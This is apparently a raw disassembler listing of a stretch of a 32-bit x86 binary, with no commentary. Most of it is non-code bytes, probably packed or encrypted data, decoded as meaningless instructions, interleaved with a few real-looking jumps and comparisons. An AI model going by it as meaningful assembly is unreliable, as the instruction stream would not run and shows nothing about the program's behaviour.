  41be84:	shl    BYTE PTR [esi-0xe1adde4],cl
  41be8a:	push   edx
  41be8b:	in     al,dx
  41be8c:	xchg   edi,eax
  41be8d:	stos   BYTE PTR es:[edi],al
  41be8e:	pusha  
  41be8f:	mov    bl,0xb2
  41be91:	cs pop es
  41be93:	xchg   esp,eax
  41be94:	push   ds
  41be95:	mov    DWORD PTR [ecx],eax
  41be97:	imul   ecx,DWORD PTR [esi],0x7f92a06f
  41be9d:	jmp    0x41bedb
  41be9f:	mov    ah,0x2f
  41bea1:	lods   eax,DWORD PTR ds:[esi]
  41bea2:	popa   
  41bea3:	mov    al,cl
  41bea5:	xor    eax,0xc67ab20b
  41beaa:	cmp    ah,ch
  41beac:	jmp    0xe011:0x52bf5c9e
  41beb3:	jnp    0x41be74
  41beb5:	stos   DWORD PTR es:[edi],eax
  41beb6:	sub    BYTE PTR [edx+0x2d62e35f],ch
  41bebc:	xchg   ebx,eax
  41bebd:	leave  
  41bebe:	cmp    bh,BYTE PTR [edx]
  41bec0:	xchg   ebp,eax
  41bec1:	ss bound edx,QWORD PTR gs:[ebx+0x75e3a69c]
  41bec9:	jb     0x41be50
  41becb:	dec    ebp
  41becc:	cmp    al,0xb6
  41bece:	jg     0x41be7b
  41bed0:	xchg   edi,eax
  41bed1:	jl     0x41bf01
  41bed3:	sbb    al,0x93
  41bed5:	dec    esp
  41bed6:	nop
  41bed7:	xor    BYTE PTR [ebx+0x10],ch
  41beda:	cwde   
  41bedb:	jnp    0x41bed1
  41bedd:	jbe    0x41bf5e
  41bedf:	pop    edx
  41bee0:	sub    esi,esp
  41bee2:	pop    edx
  41bee3:	xchg   ebx,eax
  41bee4:	je     0x41bf1d
  41bee6:	cdq    
  41bee7:	lock lock xor BYTE PTR cs:[ebp+eax*4-0x16],0x95
  41beef:	xor    ah,BYTE PTR [edi-0x77]
  41bef2:	(bad)  
  41bef3:	adc    eax,0xc0798055
  41bef8:	stc    
  41bef9:	or     al,0xb1
  41befb:	mov    ah,0x1b
  41befd:	sar    DWORD PTR [esi-0x6932f5b7],0x52
  41bf04:	xor    DWORD PTR [eax+0xeb65970],0xffffff9c
  41bf0b:	les    edx,FWORD PTR [ebp+ebx*2+0x77]
  41bf0f:	fidivr DWORD PTR [ecx]
  41bf11:	loop   0x41bf64
  41bf13:	ja     0x41bea6
  41bf15:	stos   BYTE PTR es:[edi],al
  41bf16:	adc    dl,BYTE PTR [edi]
  41bf18:	lods   al,BYTE PTR ds:[esi]
  41bf19:	ucomiss xmm4,DWORD PTR [edx]
  41bf1c:	inc    ebx
  41bf1d:	pop    edx
  41bf1e:	adc    DWORD PTR [edx+0x72d9574],edx
  41bf24:	jae    0x41bf26
  41bf26:	xchg   DWORD PTR [ebp-0x7d],eax
  41bf29:	dec    edi
  41bf2a:	pop    ecx
  41bf2b:	or     ah,bl
  41bf2d:	xor    esi,DWORD PTR [eax]
  41bf2f:	retf   
  41bf30:	out    0x8d,al
  41bf32:	mov    ss,esp
  41bf34:	cmp    cl,cl
  41bf36:	(bad)  
  41bf37:	jae    0x41bf09
  41bf39:	cmp    DWORD PTR [ecx-0x2ad5b7d4],ebx
  41bf3f:	dec    eax
  41bf40:	adc    ebp,eax
  41bf42:	hlt    
  41bf43:	ror    ch,1
  41bf45:	lods   eax,DWORD PTR ds:[esi]
  41bf46:	fld    TBYTE PTR [ebx-0x555cb12f]
  41bf4c:	retf   0x275a
  41bf4f:	mov    dl,0x3d
  41bf51:	out    0x4b,al
  41bf53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf54:	or     eax,0x2d9dea67
  41bf59:	mov    ebx,0xd307a263
  41bf5e:	arpl   WORD PTR [esi],ax
  41bf60:	xacquire xchg BYTE PTR [esi-0x1e755dfd],ch
  41bf67:	or     ebp,DWORD PTR [esp+ebp*4+0x5e78ddb6]
  41bf6e:	sbb    edi,DWORD PTR [ecx+ebp*2]
  41bf71:	push   eax
  41bf72:	inc    esi
  41bf73:	test   al,0x69
  41bf75:	das    
  41bf76:	fld    DWORD PTR [edi]
  41bf78:	sbb    eax,DWORD PTR [eax]
  41bf7a:	pop    ebp
  41bf7b:	fsubr  QWORD PTR [ecx+0x32b5830b]
  41bf81:	ins    BYTE PTR es:[edi],dx
  41bf82:	xchg   ecx,eax
  41bf83:	sbb    edx,edi
  41bf85:	xor    eax,ebx
  41bf87:	mov    al,ds:0x8e7ac15
  41bf8c:	in     eax,dx
  41bf8d:	(bad)  
  41bf8e:	cmc    
  41bf8f:	faddp  st(5),st
  41bf91:	lods   eax,DWORD PTR ds:[esi]
  41bf92:	adc    bh,dl
  41bf94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf95:	mov    eax,ds:0x1e968e2d
  41bf9a:	mov    dl,ch
  41bf9c:	mov    eax,ds:0x1591c4d2
  41bfa1:	xchg   BYTE PTR [eax-0xe],dl
  41bfa4:	push   es
  41bfa5:	jbe    0x41bfe9
  41bfa7:	mov    bl,0x7f
  41bfa9:	jae    0x41c01b
  41bfab:	sbb    al,bh
  41bfad:	mov    bl,0xab
  41bfaf:	out    dx,eax
  41bfb0:	scas   eax,DWORD PTR es:[edi]
  41bfb1:	rol    DWORD PTR [edi],0xe4
  41bfb4:	xor    BYTE PTR [edx-0x5b3a5eee],dl
  41bfba:	push   ebp
  41bfbb:	dec    esp
  41bfbc:	sar    BYTE PTR [edi+0x55],1
  41bfbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	out    0x34,eax
  41bff1:	add    dl,BYTE PTR [eax+edi*4+0x10787fe8]
  41bff8:	jle    0x41c072
  41bffa:	js     0x41bfac
  41bffc:	je     0x41c069
  41bffe:	popa   
  41bfff:	mov    edx,edi
  41c001:	aas    
  41c002:	pop    ss
  41c003:	mov    esi,0xbd80e009
  41c008:	cmp    DWORD PTR [edx-0x7d],ebp
  41c00b:	or     edi,DWORD PTR [edi-0x50]
  41c00e:	fdiv   QWORD PTR [edx]
  41c010:	shr    DWORD PTR [ebx],1
  41c012:	jg     0x41bfca
  41c014:	test   al,0xfc
  41c016:	(bad)  [eax]
  41c018:	mov    ds:0x92e461fb,eax
  41c01d:	inc    eax
  41c01e:	jge    0x41c056
  41c020:	push   cs
  41c021:	gs jmp 0xa9d7:0x51d98d55
  41c029:	sbb    edi,DWORD PTR [edx+esi*4-0x75041494]
  41c030:	in     eax,0x83
  41c032:	(bad)  
  41c033:	rcr    al,cl
  41c035:	or     DWORD PTR cs:[esi+0x6],esi
  41c039:	mov    dl,BYTE PTR [ecx]
  41c03b:	xchg   ch,al
  41c03d:	icebp  
  41c03e:	repnz in al,dx
  41c040:	sub    DWORD PTR [ebx-0xff7db2c],esp
  41c046:	push   ecx
  41c047:	mov    al,0xf6
  41c049:	and    cl,BYTE PTR [edx+0x4799ac00]
  41c04f:	out    dx,al
  41c050:	adc    eax,0xd7b333e8
  41c055:	push   es
  41c056:	(bad)  
  41c057:	xor    ecx,DWORD PTR [ebx+0x70]
  41c05a:	out    0x3b,eax
  41c05c:	loopne 0x41c0b8
  41c05e:	and    ax,0x7c78
  41c062:	lods   eax,DWORD PTR ds:[esi]
  41c063:	jae    0x41c05d
  41c065:	daa    
  41c066:	inc    esi
  41c067:	dec    ecx
  41c068:	inc    esi
  41c069:	sbb    edi,DWORD PTR [ebx+0x72c7c6db]
  41c06f:	push   0xffffff82
  41c071:	nop
  41c072:	(bad)  
  41c073:	cwde   
  41c074:	enter  0x314b,0xd6
  41c078:	jle    0x41c0f3
  41c07a:	stos   BYTE PTR es:[edi],al
  41c07b:	jp     0x41c049
  41c07d:	aas    
  41c07e:	ins    DWORD PTR es:[edi],dx
  41c07f:	or     ebp,DWORD PTR [eax]
  41c081:	pop    ebx
  41c083:	jmp    0x4eec:0x319346c3
  41c08a:	push   edi
  41c08b:	or     DWORD PTR [ecx],edx
  41c08d:	xor    dl,BYTE PTR [edi+0xe339e19]
  41c093:	call   FWORD PTR [ecx+0x26]
  41c096:	mov    ah,0xa9
  41c098:	(bad)  
  41c099:	fcomp  DWORD PTR [esi+0x328d8bf0]
  41c09f:	add    al,0x59
  41c0a1:	(bad)  
  41c0a2:	sbb    BYTE PTR [edi+0x262939e],cl
  41c0a8:	rcr    BYTE PTR [edx],0x11
  41c0ab:	lock scas eax,DWORD PTR es:[edi]
  41c0ad:	out    0xf6,eax
  41c0af:	loopne 0x41c045
  41c0b1:	in     eax,0x4b
  41c0b3:	jle    0x41c07e
  41c0b5:	mov    edi,0xdef8188b
  41c0ba:	and    ebx,DWORD PTR [eax+0x1]
  41c0bd:	idiv   DWORD PTR [ebx-0x24]
  41c0c0:	or     dh,al
  41c0c2:	(bad)  
  41c0c3:	in     eax,dx
  41c0c4:	push   eax
  41c0c5:	pop    eax
  41c0c6:	push   ebx
  41c0c7:	xor    DWORD PTR es:[ebx+0x11a0886e],esi
  41c0ce:	jmp    0x41c0a3
  41c0d0:	xchg   BYTE PTR [ebx+0x60],dh
  41c0d3:	dec    ebx
  41c0d4:	sbb    ch,dl
  41c0d6:	mov    ebp,0xa46cb214
  41c0db:	mov    ecx,0x10180e5b
  41c0e0:	es pop esi
  41c0e2:	push   edx
  41c0e3:	fwait
  41c0e4:	jne    0x41c111
  41c0e6:	js     0x41c089
  41c0e8:	pop    esi
  41c0e9:	(bad)  
  41c0ea:	retf   0x211a
  41c0ed:	out    0xba,eax
  41c0ef:	cmc    
  41c0f0:	in     eax,dx
  41c0f1:	mov    ch,0x33
  41c0f3:	outs   dx,DWORD PTR ds:[esi]
  41c0f4:	daa    
  41c0f5:	mov    ebp,0x939112a0
  41c0fa:	sbb    BYTE PTR [ebp-0x56ac9b52],dh
  41c100:	jmp    0xa902:0xd478152f
  41c107:	(bad)  
  41c108:	lods   eax,DWORD PTR ds:[esi]
  41c109:	ficom  WORD PTR [ecx+0x1a]
  41c10c:	xor    edx,DWORD PTR [eax-0x58af00ec]
  41c112:	jle    0x41c132
  41c114:	jae    0x41c10c
  41c116:	sbb    al,0x2c
  41c118:	bound  esp,QWORD PTR [ebx]
  41c11a:	jecxz  0x41c150
  41c11c:	stc    
  41c11d:	push   ebp
  41c11e:	ror    DWORD PTR [ebx-0x2e],cl
  41c121:	ja     0x41c154
  41c123:	in     eax,dx
  41c124:	ins    BYTE PTR es:[edi],dx
  41c125:	out    dx,al
  41c126:	iret   
  41c127:	fiadd  WORD PTR [esi]
  41c129:	adc    bh,BYTE PTR [esi+0x53ae4469]
  41c12f:	mov    DWORD PTR [ebp+0x2],ebp
  41c132:	cmp    BYTE PTR [ebx-0xe],dh
  41c135:	inc    edx
  41c136:	repz ds fs lahf 
  41c13a:	stos   DWORD PTR es:[edi],eax
  41c13b:	pop    es
  41c13c:	ins    DWORD PTR es:[edi],dx
  41c13d:	add    ch,ch
  41c13f:	nop
  41c140:	fisubr DWORD PTR [edx+eax*8+0x1c]
  41c144:	pop    ss
  41c145:	xchg   BYTE PTR ds:0xace3850c,dh
  41c14b:	xor    DWORD PTR [ecx+ebp*2],esi
  41c14e:	xor    edx,edx
  41c150:	adc    BYTE PTR [edi+eiz*4+0xd],bl
  41c154:	add    DWORD PTR [esi],0xffffffc1
  41c157:	cld    
  41c158:	or     edi,eax
  41c15a:	xchg   edx,eax
  41c15b:	and    DWORD PTR [edx],esp
  41c15d:	jl     0x41c113
  41c15f:	ins    DWORD PTR es:[edi],dx
  41c160:	adc    DWORD PTR [eax],edx
  41c162:	das    
  41c163:	xor    al,BYTE PTR [ebx]
  41c165:	push   esp
  41c166:	dec    ebp
  41c167:	inc    ecx
  41c168:	sub    bh,BYTE PTR [edx]
  41c16a:	(bad)  
  41c16b:	sbb    BYTE PTR [ecx-0x491e9c37],ch
  41c171:	jb     0x41c10d
  41c173:	jecxz  0x41c131
  41c175:	ins    BYTE PTR es:[edi],dx
  41c176:	idiv   BYTE PTR [edx]
  41c178:	mov    ds:0x410721d2,al
  41c17d:	push   ebx
  41c17e:	pop    edx
  41c17f:	pushf  
  41c180:	mov    al,ds:0xe9a69a1c
  41c185:	lods   al,BYTE PTR ds:[esi]
  41c186:	push   ebx
  41c187:	inc    esp
  41c188:	push   ds
  41c189:	push   0xb30d2d24
  41c18e:	stos   BYTE PTR es:[edi],al
  41c18f:	lahf   
  41c190:	xor    DWORD PTR [ecx-0x77],0x55
  41c194:	push   ss
  41c195:	(bad)  
  41c197:	daa    
  41c198:	scas   al,BYTE PTR es:[edi]
  41c199:	fwait
  41c19a:	in     al,dx
  41c19b:	sbb    al,0xda
  41c19d:	xor    al,0xf9
  41c19f:	mov    ah,0xb2
  41c1a1:	aaa    
  41c1a2:	xor    BYTE PTR [edi+0x4b],bh
  41c1a5:	(bad)  
  41c1a6:	and    DWORD PTR [ebx-0x39],ebp
  41c1a9:	fisub  WORD PTR [esi]
  41c1ab:	mov    ds,WORD PTR [ebx+0x1bab0bd7]
  41c1b1:	lods   eax,DWORD PTR ds:[esi]
  41c1b2:	mov    eax,0x123f8184
  41c1b7:	xchg   ecx,eax
  41c1b8:	enter  0xa7c7,0x6f
  41c1bc:	push   esi
  41c1bd:	and    DWORD PTR [ecx-0x64f2054a],esp
  41c1c3:	outs   dx,BYTE PTR ds:[esi]
  41c1c4:	punpckhwd mm4,QWORD PTR [ebx-0x727ec823]
  41c1cb:	out    0x31,al
  41c1cd:	adc    al,0x9c
  41c1cf:	jmp    0x67de:0x405286a8
  41c1d6:	mov    ch,0x95
  41c1d8:	dec    ecx
  41c1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1da:	loopne 0x41c24e
  41c1dc:	sub    DWORD PTR [ebx+esi*1+0x50],ebx
  41c1e0:	aad    0x8a
  41c1e2:	push   eax
  41c1e3:	sub    eax,0xc67669d6
  41c1e8:	xor    eax,0x18069589
  41c1ed:	call   0x3f2d:0x1861cce4
  41c1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f5:	cmp    dh,BYTE PTR [eax-0x21]
  41c1f8:	inc    ebp
  41c1f9:	sbb    al,0x14
  41c1fb:	jmp    0x41c186
  41c1fd:	ret    0x652b
  41c200:	ret    
  41c201:	call   FWORD PTR [edx]
  41c203:	dec    esp
  41c204:	fadd   QWORD PTR [esi-0x37e5cabd]
  41c20a:	ins    BYTE PTR es:[edi],dx
  41c20b:	into   
  41c20c:	mov    eax,0x98a903c2
  41c211:	retf   0x350f
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c22c:	stc    
  41c22d:	mov    BYTE PTR [ebx],ch
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c270
  41c238:	rcl    al,0x17
  41c23b:	mov    ah,0x17
  41c23d:	test   eax,0x11991582
  41c242:	add    esi,DWORD PTR [edi-0x2d2a749b]
  41c248:	pop    edi
  41c249:	and    BYTE PTR [edi-0x1d622ed4],ah
  41c24f:	adc    DWORD PTR [ecx-0x6],0x7b
  41c253:	xchg   ecx,eax
  41c254:	(bad)  
  41c255:	retf   0x9abe
  41c258:	outs   dx,DWORD PTR ds:[esi]
  41c259:	lods   eax,DWORD PTR ds:[esi]
  41c25a:	mov    dh,BYTE PTR [edx-0xb]
  41c25d:	or     ch,BYTE PTR [edx-0x10b9e391]
  41c263:	hlt    
  41c264:	and    dh,BYTE PTR [edx+0x0]
  41c267:	lods   al,BYTE PTR ds:[esi]
  41c268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c269:	fcmovnbe st,st(5)
  41c26b:	lods   eax,DWORD PTR ds:[esi]
  41c26c:	jnp    0x41c236
  41c26e:	push   cs
  41c26f:	int3   
  41c270:	mov    ch,BYTE PTR [esi+ebx*1-0x5c7aec11]
  41c277:	(bad)  
  41c278:	xor    esi,DWORD PTR [ebx+0x4d]
  41c27b:	test   BYTE PTR ds:0xdcedeb58,bl
  41c281:	ss cmp al,0x30
  41c284:	and    bl,ah
  41c286:	cmp    eax,0xa787de65
  41c28b:	adc    DWORD PTR [ecx],edi
  41c28d:	shl    DWORD PTR [ebx-0x4f],0xf9
  41c291:	ret    0x75d4
  41c294:	inc    eax
  41c295:	mov    cl,0xa0
  41c297:	adc    DWORD PTR [ecx-0x16],edx
  41c29a:	add    al,0x4
  41c29c:	xor    dh,BYTE PTR [edx-0x60]
  41c29f:	or     BYTE PTR [ebp-0x5b2ca06e],ch
  41c2a5:	jne    0x41c2c5
  41c2a7:	or     DWORD PTR ds:0xb99fbbb8,0xe
  41c2ae:	std    
  41c2af:	sbb    BYTE PTR [esi-0x629933a3],cl
  41c2b5:	pop    esp
  41c2b6:	(bad)  
  41c2b7:	fs stos BYTE PTR es:[edi],al
  41c2b9:	add    eax,0x9d03881d
  41c2be:	aaa    
  41c2bf:	jg     0x41c2ec
  41c2c1:	imul   ebx,DWORD PTR [edx],0x59
  41c2c4:	mov    dl,0xba
  41c2c6:	data16 jecxz 0x41c270
  41c2c9:	dec    ebp
  41c2ca:	clc    
  41c2cb:	jno    0x41c2a1
  41c2cd:	(bad)  
  41c2ce:	pushf  
  41c2cf:	je     0x41c2cc
  41c2d1:	pop    ebx
  41c2d2:	aas    
  41c2d3:	ja     0x41c340
  41c2d5:	jbe    0x41c31f
  41c2d7:	repnz adc DWORD PTR [esi-0x3e],edx
  41c2db:	imul   eax,DWORD PTR [esi-0x30ed57ad],0xe
  41c2e2:	ret    0x1506
  41c2e5:	push   esp
  41c2e6:	out    dx,eax
  41c2e7:	mov    ds:0xdfe4f9d3,al
  41c2ec:	cmp    BYTE PTR [edi+0x2d66f891],0x6
  41c2f3:	pop    eax
  41c2f4:	stos   BYTE PTR es:[edi],al
  41c2f5:	push   esi
  41c2f6:	jl     0x41c366
  41c2f8:	inc    edx
  41c2f9:	xchg   esp,eax
  41c2fa:	mov    al,ds:0x4bb5be9f
  41c2ff:	cmp    eax,0x5e0a51cb
  41c304:	lods   eax,DWORD PTR ds:[esi]
  41c305:	mov    eax,0x3147e8db
  41c30a:	or     al,0x17
  41c30c:	add    al,0x85
  41c30e:	inc    ecx
  41c30f:	sbb    DWORD PTR [eax-0x3b],0x2e3ebe61
  41c316:	inc    ecx
  41c317:	rep ins DWORD PTR es:[edi],dx
  41c319:	pop    eax
  41c31a:	push   ss
  41c31b:	cmp    al,BYTE PTR [edx]
  41c31d:	or     BYTE PTR [edi],al
  41c31f:	adc    al,0x99
  41c321:	dec    eax
  41c322:	jae    0x41c320
  41c324:	xlat   BYTE PTR ds:[ebx]
  41c325:	and    BYTE PTR [ecx+0x5fa6e25a],dl
  41c32b:	xchg   ch,bh
  41c32d:	xor    esp,esp
  41c32f:	je     0x41c335
  41c331:	push   esi
  41c332:	es stos DWORD PTR es:[edi],eax
  41c334:	loope  0x41c375
  41c336:	mov    bh,0xa9
  41c338:	outs   dx,DWORD PTR ds:[esi]
  41c339:	nop    DWORD PTR [eax+0x1c]
  41c33d:	fs stos DWORD PTR es:[edi],eax
  41c33f:	lods   al,BYTE PTR ds:[esi]
  41c340:	fmul   DWORD PTR [edx+0x69]
  41c343:	lea    ebx,[eax]
  41c345:	jmp    0x8120a941
  41c34a:	mov    dh,0xc9
  41c34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c34d:	cld    
  41c34e:	jne    0x41c3cf
  41c350:	(bad)  [edi+ecx*1+0x2]
  41c354:	(bad)  
  41c355:	adc    eax,DWORD PTR ss:[ebx]
  41c358:	cdq    
  41c359:	outs   dx,DWORD PTR ds:[esi]
  41c35a:	pop    ebx
  41c35b:	mov    bh,BYTE PTR [ebx-0xfc9d8d5]
  41c361:	std    
  41c362:	pop    ebx
  41c363:	cmp    cl,BYTE PTR [ecx+0x7118f3]
  41c369:	push   es
  41c36a:	mov    ecx,0x3f19513
  41c36f:	cli    
  41c370:	add    BYTE PTR [edi],bl
  41c372:	loope  0x41c32b
  41c374:	jae    0x41c383
  41c376:	jae    0x41c334
  41c378:	add    eax,0x5df2588
  41c37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c37e:	inc    ecx
  41c37f:	test   DWORD PTR [ecx+0x64],edi
  41c382:	imul   esp,edi,0x1
  41c385:	jge    0x41c310
  41c387:	jns    0x41c372
  41c389:	adc    DWORD PTR [ebx-0x8],ebp
  41c38c:	rcr    al,cl
  41c38e:	push   edx
  41c38f:	hlt    
  41c390:	lahf   
  41c391:	xchg   edi,eax
  41c392:	jmp    FWORD PTR [edx+0x52]
  41c395:	push   eax
  41c396:	or     ecx,DWORD PTR [ebp+0x3fcc84e8]
  41c39c:	mov    dl,0xeb
  41c39e:	lds    eax,FWORD PTR [ebp-0x298dcf7c]
  41c3a4:	(bad)  
  41c3a5:	jle    0x41c382
  41c3a7:	gs data16 ins BYTE PTR es:[edi],dx
  41c3aa:	fisttp DWORD PTR [edi]
  41c3ac:	jp     0x41c427
  41c3ae:	mov    edx,0x20dd1a46
  41c3b3:	je     0x41c361
  41c3b5:	bound  edi,QWORD PTR [edi-0x33]
  41c3b8:	xor    bh,BYTE PTR [ecx]
  41c3ba:	dec    eax
  41c3bb:	jo     0x41c346
  41c3bd:	pop    esi
  41c3be:	fdiv   QWORD PTR [esi]
  41c3c0:	loope  0x41c426
  41c3c2:	lock iret 
  41c3c4:	mov    eax,0x9ec34358
  41c3c9:	imul   ebp,DWORD PTR [ebx],0xffffffaa
  41c3cc:	out    0x7b,eax
  41c3ce:	pop    es
  41c3cf:	sti    
  41c3d0:	inc    edi
  41c3d1:	cmp    dl,BYTE PTR [edx-0x3e]
  41c3d4:	sbb    al,0x46
  41c3d6:	retf   0x6e0f
  41c3d9:	ret    
  41c3da:	xchg   ebp,eax
  41c3db:	imul   ebp,DWORD PTR [eax+0x22e70a6],0x74
  41c3e2:	xchg   al,bl
  41c3e4:	adc    eax,0x77b2608a
  41c3e9:	rol    WORD PTR [ebp+0x4f32e69],cl
  41c3f0:	enter  0x3f90,0xe0
  41c3f4:	clc    
  41c3f5:	icebp  
  41c3f6:	lock test BYTE PTR [ecx+edi*2-0x36a36b5c],al
  41c3fe:	cmp    dh,dh
  41c400:	loop   0x41c3b9
  41c402:	clc    
  41c403:	repz dec edi
  41c405:	push   esp
  41c406:	sub    eax,0x61cae05a
  41c40b:	(bad)  
  41c40c:	int3   
  41c40d:	mov    ebp,0x10c72914
  41c412:	fstp   DWORD PTR ds:0x43722339
  41c418:	pop    edx
  41c419:	add    ch,BYTE PTR [eax]
  41c41b:	mov    eax,esp
  41c41d:	das    
  41c41e:	pop    eax
  41c41f:	clc    
  41c420:	jecxz  0x41c454
  41c422:	pop    es
  41c423:	push   ss
  41c424:	jmp    0xcbb6:0xf059f5f2
  41c42b:	repz jne 0x41c4a5
  41c42e:	jg     0x41c427
  41c430:	imul   edi,DWORD PTR [edx+0x6a],0xcbc67d6e
  41c437:	mov    ds:0x1e70f44f,eax
  41c43c:	rcr    edi,0x30
  41c43f:	test   ch,dh
  41c441:	daa    
  41c442:	in     al,0x36
  41c444:	nop
  41c445:	retf   0x352f
  41c448:	scas   eax,DWORD PTR es:[edi]
  41c449:	jb     0x41c3df
  41c44b:	mov    bl,0xb0
  41c44d:	jecxz  0x41c47c
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c4b3
  41c464:	das    
  41c465:	push   esi
  41c466:	cld    
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c46a
  41c470:	shl    bl,1
  41c472:	push   es
  41c473:	das    
  41c474:	adc    bl,BYTE PTR [esi-0xd5f9912]
  41c47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c47b:	jae    0x41c4dd
  41c47d:	pop    ds
  41c47e:	mov    ebx,0x2a0cdfdc
  41c483:	sbb    eax,DWORD PTR ds:0xc20c214d
  41c489:	hlt    
  41c48a:	data16 xchg bp,ax
  41c48d:	ins    DWORD PTR es:[edi],dx
  41c48e:	sub    cl,BYTE PTR [ecx+esi*8-0x53]
  41c492:	test   al,0x31
  41c494:	inc    eax
  41c495:	mov    ah,BYTE PTR [ebx-0x5363db26]
  41c49b:	mov    ch,0x66
  41c49d:	lea    ecx,[ecx+0x39]
  41c4a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a1:	scas   eax,DWORD PTR es:[edi]
  41c4a2:	jge    0x41c511
  41c4a4:	ja     0x41c4ed
  41c4a6:	mov    al,ds:0x28064c5e
  41c4ab:	cmp    DWORD PTR [eax],eax
  41c4ad:	push   ds
  41c4ae:	xchg   edx,eax
  41c4af:	or     al,bl
  41c4b1:	inc    ebx
  41c4b2:	aam    0x34
  41c4b4:	xchg   edi,eax
  41c4b5:	ja     0x41c4a0
  41c4b7:	dec    ebx
  41c4b8:	xchg   ebp,eax
  41c4b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ba:	imul   BYTE PTR [ecx]
  41c4bc:	mov    al,0xc8
  41c4be:	std    
  41c4bf:	test   eax,0x801da178
  41c4c4:	jmp    0x41c517
  41c4c6:	sbb    edi,esp
  41c4c8:	mov    ecx,ebp
  41c4ca:	into   
  41c4cb:	or     al,0x99
  41c4cd:	inc    ebx
  41c4ce:	xchg   ecx,eax
  41c4cf:	inc    ecx
  41c4d0:	pop    edx
  41c4d1:	dec    BYTE PTR [eax-0x28]
  41c4d4:	inc    ebx
  41c4d5:	mov    ah,0x97
  41c4d7:	sbb    al,0xef
  41c4d9:	push   ebx
  41c4da:	test   DWORD PTR [edi-0x106509ea],0x9f704cb5
  41c4e4:	jmp    0x41c4b6
  41c4e6:	and    al,0x5f
  41c4e8:	ins    BYTE PTR es:[edi],dx
  41c4e9:	or     al,0x8f
  41c4eb:	clc    
  41c4ec:	std    
  41c4ed:	ins    DWORD PTR es:[edi],dx
  41c4ee:	out    0x18,al
  41c4f0:	push   ss
  41c4f1:	je     0x41c478
  41c4f3:	popf   
  41c4f4:	(bad)  
  41c4f6:	mov    ds:0x3c092b62,al
  41c4fb:	popa   
  41c4fc:	add    BYTE PTR [esi-0x1549b1a1],dh
  41c502:	adc    BYTE PTR [eax],ah
  41c504:	xor    ecx,DWORD PTR [ebp+0x7]
  41c507:	retf   
  41c508:	xchg   BYTE PTR [bx+0x6f],al
  41c50c:	int3   
  41c50d:	pslld  mm4,QWORD PTR [ebx+0x2e57a3e6]
  41c514:	xchg   edi,eax
  41c515:	loopne 0x41c512
  41c517:	mov    al,ds:0x6a24a580
  41c51c:	add    edx,eax
  41c51e:	repz loopne 0x41c4b7
  41c521:	int    0x68
  41c523:	inc    ebx
  41c524:	xchg   ebx,eax
  41c525:	sbb    DWORD PTR [eax-0x38],esi
  41c528:	fiadd  WORD PTR [ebp+ebp*2+0x4460a4b5]
  41c52f:	fsubr  QWORD PTR [eax+0x57]
  41c532:	mov    eax,ds:0xd9555dac
  41c537:	add    eax,0x71f45f99
  41c53c:	out    0x5f,eax
  41c53e:	loop   0x41c4d7
  41c540:	add    eax,0x57644116
  41c545:	jmp    0x41c550
  41c547:	sub    esi,DWORD PTR [edx-0x7048eccd]
  41c54d:	imul   esp,DWORD PTR [esp+ebp*8+0x20c90cb7],0x76
  41c555:	cmp    ecx,ebp
  41c557:	aam    0x15
  41c559:	sub    bl,dl
  41c55b:	sub    al,0x21
  41c55d:	cmp    bl,bl
  41c55f:	in     eax,dx
  41c560:	je     0x41c584
  41c562:	pop    esp
  41c563:	adc    al,0xba
  41c565:	call   DWORD PTR [eax-0x3f]
  41c568:	push   ecx
  41c569:	ror    DWORD PTR [ebp*8-0x2dd20330],0xdf
  41c571:	mov    eax,ds:0xab9af4e0
  41c576:	dec    edx
  41c577:	inc    ecx
  41c578:	jae    0x41c5cf
  41c57a:	add    eax,0xfc583f1f
  41c57f:	iret   
  41c580:	fisub  DWORD PTR [edi]
  41c582:	arpl   bp,bx
  41c584:	loope  0x41c57a
  41c586:	ror    ebx,0xc8
  41c589:	xchg   esi,eax
  41c58a:	fdivrp st(5),st
  41c58c:	push   ebx
  41c58d:	lahf   
  41c58e:	rcl    DWORD PTR [edx+0x7c],0x35
  41c592:	mov    ah,0xfa
  41c594:	mov    ds:0x83177a8b,eax
  41c599:	sbb    eax,0x2ebe0395
  41c59e:	stos   BYTE PTR es:[edi],al
  41c59f:	xchg   esi,eax
  41c5a0:	jmp    0x7208d7e3
  41c5a5:	pop    esi
  41c5a6:	in     al,0x46
  41c5a8:	cmp    DWORD PTR [esi+esi*2-0xd26ba94],ebp
  41c5af:	sbb    BYTE PTR [ecx-0x4a83a691],cl
  41c5b5:	sahf   
